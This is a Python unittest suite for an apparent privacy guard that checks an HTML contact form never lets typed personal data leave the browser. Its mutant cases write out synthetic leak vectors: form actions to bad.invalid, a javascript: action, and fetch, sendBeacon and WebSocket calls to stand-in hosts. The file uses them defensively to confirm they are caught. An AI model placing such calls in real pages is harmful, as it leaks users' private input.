"""R369 offline, synthetic-only adverse input/network tests. Never supply real PII."""
from __future__ import annotations
import importlib.util
import json
from pathlib import Path
import sys
import tempfile
import unittest
from unittest.mock import patch

FILE=Path(__file__).resolve().parents[1]/'tools/r369_card_private_input_runtime_custody.py'
sp=importlib.util.spec_from_file_location('r369',FILE)
m=importlib.util.module_from_spec(sp);sys.modules[sp.name]=m;sp.loader.exec_module(m)
GOOD='''<!doctype html><html lang="en"><body>
<form id="rc" onsubmit="return false"><label for="a">Contact</label><input id="a" type="text" autocomplete="off"></form>
<noscript>Use a paper card</noscript></body></html>'''
JS_GOOD=GOOD.replace('</body>','<script>document.querySelector("#a").addEventListener("input",()=>{});</script></body>')

class Basic(unittest.TestCase):
    def test_release_hold(self):self.assertTrue(all(x is False for x in m.HOLD.values()))
    def test_report_clear_still_hold(self):self.assertEqual(m.verdict()['status'],'REVIEW_REQUIRED_HARD_HOLD')
    def test_report_error_invalid(self):self.assertEqual(m.verdict(['x'])['status'],'INVALID_HARD_HOLD')
    def test_error_dedup(self):self.assertEqual(m.verdict(['z','a','z'])['errors'],['a','z'])
    def test_schema(self):self.assertTrue(m.SCHEMA.startswith('fv-preparedness-'))
    def test_sentinel_synthetic(self):self.assertTrue(m.SENTINEL.startswith('FV_R369_SYNTHETIC'))
    def test_original_git_pins(self):self.assertEqual((len(m.PIN_BODY),len(m.PIN_META)),(40,40))
    def test_good_static(self):self.assertEqual(m.static_guard(GOOD)[0],[])
    def test_synthetic_not_in_report(self):self.assertNotIn(m.SENTINEL,str(m.verdict()))
    def test_static_source_length(self):self.assertEqual(m.static_guard('a'*2_000_001)[0],['INVALID_SOURCE_SIZE_OR_TYPE'])
    def test_static_not_string(self):self.assertIn('INVALID_SOURCE_SIZE_OR_TYPE',m.static_guard(None)[0])
    def test_browser_not_string(self):self.assertIn('INVALID_BROWSER_INPUT',m.browser_guard(None)[0])
    def test_browser_oversize(self):self.assertIn('INVALID_BROWSER_INPUT',m.browser_guard('a'*2_000_001)[0])
    def test_missing_browser(self):self.assertIn('CHROMIUM_UNAVAILABLE',m.browser_guard(GOOD,executable='/absent')[0])
    def test_missing_root(self):self.assertIn('AUTHENTIC_ROOT_MISSING',m.audit('/missing-r369-root')['errors'])
    def test_blank_root(self):
        with tempfile.TemporaryDirectory() as d:self.assertIn('ORIGINAL_TOOL104_FILES_MISSING',m.audit(d)['errors'])
    def test_main_nonzero(self):
        with tempfile.TemporaryDirectory() as d:self.assertEqual(m.main(['--root',d]),2)
    def test_safety_flags_with_evidence(self):
        r=m.verdict([],{"synthetic_pass":True});self.assertTrue(all(r[x] is False for x in m.HOLD))
    def test_safety_flags_with_error(self):
        r=m.verdict(['demo']);self.assertTrue(all(r[x] is False for x in m.HOLD))
    def test_no_remote_apis_in_tool(self):
        s=FILE.read_text();self.assertNotIn('requests.post(',s);self.assertNotIn('wp-json/wp/v2/posts',s)
    def test_static_named_counts(self):
        e,ev=m.static_guard(GOOD);self.assertEqual(ev['named_controls'],0)
    def test_control_outside_form_not_counted(self):
        e,ev=m.static_guard(GOOD.replace('</body>','<input name="external" /></body>'))
        self.assertEqual(ev['named_controls'],0)
    def test_script_counter(self):self.assertEqual(m.static_guard(JS_GOOD)[1]['script_count'],1)
    def test_handler_count(self):self.assertGreaterEqual(m.static_guard(GOOD)[1]['inline_handler_elements'],1)
    def test_form_parser_does_not_modify(self):
        before=GOOD; m.static_guard(GOOD);self.assertEqual(GOOD,before)
    def test_separate_name(self):self.assertEqual(m.FormInventory().forms,[])
    def test_html_malformed_but_fail_to_grant(self):
        e,_=m.static_guard('<form id="rc"><input name="x">');self.assertIn('FORM_NAMED_FIELDS_CAN_REACH_QUERY_OR_BODY',e)

STATIC_MUTANTS={
'missing_form':GOOD.replace('<form','<div').replace('</form>','</div>'),
'wrong_form_id':GOOD.replace('id="rc"','id="other"'),
'duplicate_form':GOOD.replace('</body>','<form id="extra"></form></body>'),
'get_named_field':GOOD.replace('id="a" type','id="a" name="phone" type'),
'named_tel':GOOD.replace('type="text"','type="tel" name="number"'),
'named_hidden':GOOD.replace('</form>','<input type="hidden" name="token" value="synthetic"></form>'),
'named_select':GOOD.replace('</form>','<select name="next"><option>X</option></select></form>'),
'named_textarea':GOOD.replace('</form>','<textarea name="notes"></textarea></form>'),
'action_https':GOOD.replace('<form id="rc"','<form id="rc" action="https://bad.invalid/"'),
'action_local':GOOD.replace('<form id="rc"','<form id="rc" action="/save"'),
'action_query':GOOD.replace('<form id="rc"','<form id="rc" action="?child=1"'),
'action_javascript':GOOD.replace('<form id="rc"','<form id="rc" action="javascript:alert(1)"'),
'method_post':GOOD.replace('<form id="rc"','<form id="rc" method="post"'),
'method_dialog':GOOD.replace('<form id="rc"','<form id="rc" method="dialog"'),
'method_put':GOOD.replace('<form id="rc"','<form id="rc" method="put"'),
'target_blank':GOOD.replace('<form id="rc"','<form id="rc" target="_blank"'),
'target_parent':GOOD.replace('<form id="rc"','<form id="rc" target="_parent"'),
'fetch':GOOD+'<script>fetch("/collect")</script>',
'XMLHttpRequest':GOOD+'<script>new XMLHttpRequest()</script>',
'sendBeacon':GOOD+'<script>navigator.sendBeacon("/collect","x")</script>',
'WebSocket':GOOD+'<script>new WebSocket("ws://bad.invalid")</script>',
'localStorage':GOOD+'<script>localStorage.setItem("x","v")</script>',
'sessionStorage':GOOD+'<script>sessionStorage.setItem("x","v")</script>',
'indexedDB':GOOD+'<script>indexedDB.open("temp")</script>',
'cookie':GOOD+'<script>document.cookie="x=1"</script>',
}
class Mutants(unittest.TestCase):pass
for key,html in STATIC_MUTANTS.items():
    def t(self,key=key,html=html):
        errs,_=m.static_guard(html)
        self.assertTrue(errs,key)
    setattr(Mutants,'test_'+key,t)

class Runtime(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        if not Path('/usr/bin/chromium').exists():raise unittest.SkipTest('no chromium')
    def test_js_off_get_navigation_caught(self):
        errors,observations=m.browser_guard(GOOD)
        self.assertIn('js_off',observations)
        self.assertIn('UNEXPECTED_BROWSER_NAVIGATION:js_off',errors)
        self.assertTrue(all(x is False for x in m.HOLD.values()))
    def test_unamed_enter_not_assumed_safe(self):
        errors,observations=m.browser_guard(GOOD)
        self.assertIn('UNEXPECTED_BROWSER_NAVIGATION:js_off',errors)
        self.assertFalse(observations['js_off']['sentinel_requests'])
    def test_realistic_js_on_false_submit(self):
        errors,observations=m.browser_guard(JS_GOOD)
        self.assertIn('js_on',observations)
        self.assertEqual(observations['js_on']['sentinel_requests'],0)
    def test_named_field_request_flagged(self):
        html=GOOD.replace('id="a" type="text"','id="a" type="text" name="personal"')
        errors,obs=m.browser_guard(html)
        self.assertIn('SYNTHETIC_INPUT_IN_BROWSER_URL:js_off',errors)
        self.assertTrue(obs['js_off']['synthetic_input_in_url'])
    def test_js_network_attempt_flagged(self):
        html=GOOD.replace('</body>','<script>fetch("https://outside.invalid/collect")</script></body>')
        errors,obs=m.browser_guard(html)
        self.assertIn('UNEXPECTED_NETWORK_REQUEST:js_on',errors)
        self.assertGreater(obs['js_on']['external_requests'],0)
    def test_js_storage_flagged(self):
        html=GOOD.replace('</body>','<script>localStorage.setItem("synthetic","1")</script></body>')
        errors,obs=m.browser_guard(html)
        self.assertIn('BROWSER_STORAGE_WRITE_OBSERVED:js_on',errors)
    def test_missing_form_runtime(self):
        errors,_=m.browser_guard('<!doctype html><html><body>No form</body></html>')
        self.assertIn('RUNTIME_FORM_IDENTITY_DRIFT',errors)
    def test_missing_text_field_runtime(self):
        html=GOOD.replace('type="text"','type="checkbox"')
        errors,_=m.browser_guard(html)
        self.assertIn('NO_EDITABLE_RUNTIME_FIELD',errors)

class Prerequisites(unittest.TestCase):
    def test_missing_r368(self):
        with tempfile.TemporaryDirectory() as d:
            root=Path(d);p=root/m.BODY;q=root/m.META;p.parent.mkdir(parents=True)
            p.write_text(GOOD);q.write_text(json.dumps({'slug':'family-reunification-card','n':104,'status':{'publish':'draft'},'safety_review':{'state':'pending'}}))
            with patch.object(m,'PIN_BODY',__import__('hashlib').sha1(f'blob {len(p.read_bytes())}\0'.encode()+p.read_bytes()).hexdigest()),patch.object(m,'PIN_META',__import__('hashlib').sha1(f'blob {len(q.read_bytes())}\0'.encode()+q.read_bytes()).hexdigest()):
                r=m.audit(root)
            self.assertIn('R368_PREREQUISITE_MISSING',r['errors'])
    def test_bad_original_pin(self):
        with tempfile.TemporaryDirectory() as d:
            root=Path(d);p=root/m.BODY;q=root/m.META;p.parent.mkdir(parents=True)
            p.write_text(GOOD);q.write_text('{}')
            r=m.audit(root);self.assertIn('ORIGINAL_SOURCE_PIN_CHANGED',r['errors'])
    def test_symlink_fails_closed(self):
        with tempfile.TemporaryDirectory() as d:
            root=Path(d);p=root/m.BODY;q=root/m.META;p.parent.mkdir(parents=True)
            q.write_text('{}');p.symlink_to(q)
            r=m.audit(root);self.assertIn('ORIGINAL_TOOL104_FILES_MISSING',r['errors'])

if __name__=='__main__':unittest.main()
